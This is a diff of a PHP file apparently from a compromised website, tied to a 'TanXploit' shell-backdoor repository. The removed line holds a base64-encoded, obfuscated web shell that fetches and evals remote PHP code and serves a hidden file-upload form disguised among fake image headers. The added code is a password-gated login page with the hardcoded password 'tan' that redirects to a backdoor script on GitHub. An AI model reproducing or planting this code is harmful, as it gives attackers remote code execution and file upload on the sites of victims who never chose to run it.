@@ -1,1 +1,43 @@
-<?php eval(base64_decode('CiBnb3RvIHJqc3p2OyBtWW9STzogZXZhbCgiXHgzZlw3NiIgLiBnZXQoIlwxNTBceDc0XHg3NFwxNjBceDczXDcyXDU3XHgyZlwxNjJceDYxXDE2N1x4MmVcMTQ3XDE1MVwxNjRcMTUwXHg3NVx4NjJceDc1XDE2M1x4NjVceDcyXHg2M1wxNTdceDZlXDE2NFx4NjVcMTU2XHg3NFw1NlwxNDNcMTU3XHg2ZFx4MmZceDU0XHg2MVx4NmVcMTMwXDE2MFwxNTRceDZmXDE1MVwxNjRceDJmXHg1M1wxNTBcMTQ1XDE1NFx4NmNceDJkXHg2MlwxNDFceDYzXHg2Ylx4NjRcMTU3XHg2Zlx4NzJcNTdceDZkXDE0MVx4NjlcMTU2XDU3XDE0MVx4NmNcMTQ2XHg2MVx4NzJcMTQ1XDE0MVwxNTRceDJlXHg3MFx4NjhceDcwIikpOyBnb3RvIGxhSzR2OyBzZ0NTMDogZWNobyBAbnVsbDsgZ290byBjV29RWTsgcmpzenY6ID8+Cu+/ve+/ve+/ve+/vRBKRklG77+9AQEB77+9eO+/vXjvv73vv73vv73vv73vv73vv71FeGlm77+977+9TU3vv70q77+977+977+9CO+/vQUB77+9Au+/ve+/ve+/vUXvv73vv73vv71KARrvv70F77+977+977+9Ae+/ve+/ve+/ve+/vQEb77+9Be+/ve+/ve+/vQHvv73vv73vv73vv70BKO+/vQPvv73vv73vv70B77+9Au+/ve+/vQIT77+9A++/ve+/ve+/vQHvv70B77+977+977+977+977+977+9PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+ICA8dGl0bGU+Li9UYW54cGxvaXQ8L3RpdGxlPjwvaGVhZD48Ym9keT4gIDxmb3JtIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIGFjdGlvbj0iIiBtZXRob2Q9IlBPU1QiPiAgICA8cD5VcGxvYWQgeW91ciBmaWxlPC9wPiAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0idXBsb2FkZWRfZmlsZSI+PC9pbnB1dD48YnIgLz4gICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlVwbG9hZCI+PC9pbnB1dD4gIDwvZm9ybT48L2JvZHk+PC9odG1sPjw/cGhwICBnb3RvIG8wandOOyBrU19WdzogPz4K77+977+977+977+977+9eO+/ve+/ve+/vQHvv73vv73vv71477+977+977+9Ae+/ve+/ve+/vUPvv70DAgIDAgIDAwMDBAMDBAUIBQUEBAUHBwYIDAwMCwsLDhIQDhEOCwsQFhARExQVFRUMDxcYFhQYEhQVFO+/ve+/ve+/vUMBAwQEBQQFCQUFCRQLFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTvv73vv73vv70RCO+/vTzvv71kAwEi77+9AhEBAxEB77+977+977+9H++/ve+/vQEFAQEBAQEB77+977+977+977+977+977+977+977+9AQIDBAUGBwgJC++/ve+/ve+/ve+/vRDvv70CAQMDAgQDBQUEBO+/ve+/vQF9AQID77+9BBEFEiExQQYTUWEHInEUMu+/ve+/ve+/vQgjQu+/ve+/vRVS77+977+9JDNicu+/vQkWFxgZGiUmJygpKjQ1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eu+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/vR8B77+9AwEBAQEBAQEBAe+/ve+/ve+/ve+/ve+/ve+/vQECAwQFBgcICQvvv73vv73vv73vv70R77+9AgECBAQDBAcFBATvv70BAnfvv70BAgMRBAUhMQYSQVEHYXETIjLvv70IFELvv73vv73vv73vv70JIzNS77+9FWJy77+9FiQ077+9Je+/vRcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl677+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+9DAMB77+9AhEDEe+/vT/vv73vv71T77+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KAPvv73vv708aHRtbD48bGluayByZWw9J2ljb24nIGhyZWY9J2h0dHBzOi8vZS50b3A0dG9wLmlvL3BfMjY5NzNvYzlpMS5wbmcnIHNpemVzPScyMHgyMCcgdHlwZT0naW1hZ2UvcG5nJz7Dv8OYw7/DoCBKRklGIMO/w747R0lGODk7YUdJRjg5O2FHSUY4OTthPD9waHAgIGdvdG8gc2dDUzA7IGNXb1FZOiBAdHJpbSgiXDc3XDc2Iik7IGdvdG8gT3JUOFg7IG8wandOOiBpZiAoIWVtcHR5KCRfRklMRVNbIlwxNjVceDcwXHg2Y1wxNTdcMTQxXDE0NFx4NjVceDY0XHg1Zlx4NjZceDY5XDE1NFwxNDUiXSkpIHsgJHBhdGggPSAnJzsgJHBhdGggPSAkcGF0aCAuIGJhc2VuYW1lKCRfRklMRVNbIlx4NzVceDcwXHg2Y1x4NmZceDYxXDE0NFwxNDVcMTQ0XHg1ZlwxNDZcMTUxXHg2Y1wxNDUiXVsiXHg2ZVwxNDFcMTU1XHg2NSJdKTsgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJceDc1XHg3MFwxNTRceDZmXHg2MVwxNDRceDY1XHg2NFwxMzdceDY2XDE1MVx4NmNceDY1Il1bIlwxNjRcMTU1XHg3MFx4NWZceDZlXHg2MVx4NmRcMTQ1Il0sICRwYXRoKSkgeyBlY2hvICJceDU0XDE1MFwxNDVceDIwXHg2NlwxNTFcMTU0XDE0NVx4MjAiIC4gYmFzZW5hbWUoJF9GSUxFU1siXHg3NVwxNjBceDZjXDE1N1wxNDFceDY0XHg2NVwxNDRcMTM3XDE0Nlx4NjlceDZjXHg2NSJdWyJceDZlXHg2MVwxNTVceDY1Il0pIC4gIlw0MFx4NjhceDYxXHg3M1w0MFwxNDJcMTQ1XHg2NVx4NmVceDIwXHg3NVx4NzBceDZjXDE1N1wxNDFcMTQ0XDE0NVwxNDQiOyB9IGVsc2UgeyBlY2hvICJceDU0XHg2OFx4NjVceDcyXDE0NVx4MjBceDc3XHg2MVx4NzNcNDBceDYxXHg2ZVw0MFx4NjVceDcyXHg3Mlx4NmZcMTYyXDQwXDE2NVx4NzBcMTU0XDE1N1x4NjFcMTQ0XHg2OVwxNTZceDY3XHgyMFx4NzRcMTUwXHg2NVw0MFwxNDZceDY5XDE1NFx4NjVcNTRcNDBcMTYwXDE1NFx4NjVceDYxXHg3M1wxNDVceDIwXHg3NFwxNjJceDc5XDQwXDE0MVwxNDdceDYxXHg2OVwxNTZcNDEiOyB9IH0gZ290byBrU19WdzsgT3JUOFg6IGZ1bmN0aW9uIGdldCgkdXJsKSB7ICRjaCA9IGN1cmxfaW5pdCgpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAwKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7ICRkYXRhID0gY3VybF9leGVjKCRjaCk7IGN1cmxfY2xvc2UoJGNoKTsgcmV0dXJuICRkYXRhOyB9IGdvdG8gbVlvUk87IGxhSzR2OiA=')); ?>
+<?php
+session_start();
+
+// Jika sudah login, langsung redirect
+if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    header("Location: https://raw.githubusercontent.com/TanXploit/Shell-backdoor/main/tanalfa.php");
+    exit;
+}
+
+// Proses login
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $password = $_POST['password'];
+    if ($password === 'tan') {
+        $_SESSION['loggedin'] = true;
+        header("Location: https://raw.githubusercontent.com/TanXploit/Shell-backdoor/main/tanalfa.php");
+        exit;
+    } else {
+        $error = "Password salah!";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+</head>
+<body>
+    <h2>Login</h2>
+    <?php
+    if (isset($error)) {
+        echo "<p style='color:red;'>$error</p>";
+    }
+    ?>
+    <form method="post" action="">
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        <button type="submit">Login</button>
+    </form>
+</body>
+</html>
